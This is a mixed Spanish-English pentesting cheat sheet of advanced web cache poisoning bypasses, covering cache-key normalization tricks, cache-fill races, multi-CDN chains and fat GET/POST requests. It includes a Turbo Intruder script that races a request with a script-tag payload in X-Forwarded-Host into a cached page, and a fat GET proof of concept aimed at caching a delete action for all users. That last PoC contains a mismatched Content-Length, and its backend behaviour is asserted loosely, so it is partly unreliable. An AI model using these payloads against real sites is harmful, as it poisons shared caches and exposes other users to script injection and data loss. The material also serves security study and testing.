---
aliases:
  - WCP Advanced Bypass
  - Cache Race Condition
  - Multi-CDN Cache
  - Fat GET
tags:
  - type/cheatsheet
  - vuln/cache-poisoning
  - technique/defense-evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Web Cache Poisoning]]'
---
# Web Cache Poisoning - Bypasses Avanzados

***

## Cache Key Normalization Tricks

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Cache puede normalizar cache key (e.g. lowercase URL, sort query params). Diferencias entre normalización del cache vs backend → poisoning. | Differential normalization. |
| Param order | `?b=2&a=1` vs `?a=1&b=2` | Cache trata mismo, backend distinto (o viceversa). |
| Param case | `?Foo=1` vs `?foo=1` | Backend case-insensitive, cache no. |
| Param duplicate | `?a=1&a=2` | Cache toma uno, backend toma otro. |
| Empty value | `?a=&b=2` vs `?b=2` | Cache trata distinto. |
| Path case | `/PAGE` vs `/page` | Igual idea. |
| Trailing slash | `/page/` vs `/page` | Cache normaliza? |
| Query string fragments | `?#xyz` vs `?` (fragment NO se envía) | Cache may include el `#`. |
| Encoded vs unencoded | `?a=hello%20world` vs `?a=hello world` | Edge case. |
| Cache with custom params | App custom param ignored by cache | Specific config. |
| Vary `Accept-Encoding` | Different encodings → distinct cache slots | gzip vs br vs identity. |
| Vary `Accept-Language` | Multi-lingual cache | i18n. |
^wcp-bypass-normalization

### Discover normalization quirks

```bash
URL="https://target/page"

# Test param order
for combo in "?a=1&b=2" "?b=2&a=1"; do
  CB="cb=$(date +%s%N)"
  curl -sI "${URL}${combo}&${CB}" | grep -i x-cache
done

# Test case
for c in "?A=1" "?a=1"; do
  CB="cb=$(date +%s%N)"
  curl -sI "${URL}${c}&${CB}" | grep -i x-cache
done

# Test trailing slash
for s in "/page" "/page/"; do
  CB="?cb=$(date +%s%N)"
  curl -sI "https://target${s}${CB}" | grep -i x-cache
done
```

___

## Race Conditions en Cache Fill

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | Window entre cache miss y cache fill — atacante puede slip request entre que origin genera y cache stores | Timing-sensitive. |
| Single-flight bypass | Cache que serializes requests al origin (lock) — race entre lock acquire | Edge. |
| Cache stampede | Multiple cache misses simultáneos al expirar TTL → backend overload | Performance + opportunity. |
| Race poison | Mientras cache fill in progress, atacante manda poisoned request → wins race | Specific timing. |
| Combine con HRS | HRS + cache fill window → pollute durante fill | Compuesto. |
| Async cache update | Cache que valida en background — race en el update | Edge. |
| Pre-warm exploit | Force cache miss + race con poison antes de victim hit | Multi-step. |
| Turbo Intruder timing | Burp turbo + scripts para race timing | Tooling. |
| Cache validation race | If-Modified-Since header race | Conditional GET. |
| Distributed cache eventual consistency | Multi-node race | Edge case. |
^wcp-bypass-race

### Turbo Intruder cache race

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           pipeline=False)

    poison_req = '''GET /page?cb=12345 HTTP/1.1
Host: target.com
X-Forwarded-Host: <script>alert(1)</script>

'''

    legit_req = '''GET /page?cb=12345 HTTP/1.1
Host: target.com

'''

    # Race: legit fills cache, poison wins
    engine.queue(poison_req)
    for _ in range(50):
        engine.queue(legit_req)
```

___

## Multi-CDN Chains

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concepto | App con Cloudflare → Akamai → origin. Cada cache normaliza distinto → diferenciales acumulables. | Multi-tier discrepancies. |
| Detect multi-tier | Headers `Via:`, `X-Cache-*` con múltiples valores | Indicador. |
| Mixed normalization | CF lowercase URL, Akamai no | Different keys per tier. |
| Edge node selection | Geographic CDN edges | Per-region poison. |
| Stale-while-revalidate chains | Multiple staleness layers | Complex. |
| Cookie strip varies | One CDN strips cookies, otro no | Mixed cache key. |
| Header strip varies | Custom headers strip in one tier | Differential. |
| Full chain attack | Poison Cloudflare cache → it serves to Akamai → poisons Akamai too | Cascading. |
| Subdomain CDN switch | `static.target.com` (CF) vs `target.com` (Akamai) | Different config. |
| Combine con DNS rebinding | Force resolve to specific edge | Advanced. |
^wcp-bypass-multicdn

___

## Fat GET / Fat POST

| **Trick** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Fat GET | GET con body — ambiguo, RFC permite pero no fomenta | Cache may ignore body, backend processes. |
| Fat GET poison | `GET /page HTTP/1.1\r\nHost: target\r\nContent-Length: 22\r\n\r\nuser=admin&action=evil` | Cache key = URL only, backend processes body. |
| POST con cache header forced | `POST /page` con `Cache-Control: public, max-age=3600` | Backend may respect header → cache POST response. |
| POST cache vector | App acepta POST con form-urlencoded body | Common con forms. |
| HEAD response cached as GET | Cache cachea HEAD response, sirve a GET request subsequent | HEAD/GET cache pollution. |
| TRACE method abuse | TRACE method response cached | Edge. |
| Chunked Transfer-Encoding cached | Body chunked → cache may cache differently | Combo HRS. |
| OPTIONS cached | OPTIONS preflight cached as actual request | CORS edge. |
| HTTP/2 frame poisoning | H2-specific frame ordering races | Modern. |
| Combine con method override | `_method=GET` en POST | Multi-vector. |
^wcp-bypass-fat

### Fat GET PoC

```http
GET /admin/user-data HTTP/1.1
Host: target.com
Content-Length: 27
Cache-Control: public, max-age=3600

action=delete&id=1
```

Cache treats as standard GET (ignores body). Backend processes body como POST → ejecuta delete. Response (DELETE confirmation) cached como `/admin/user-data` para todos los users.

***
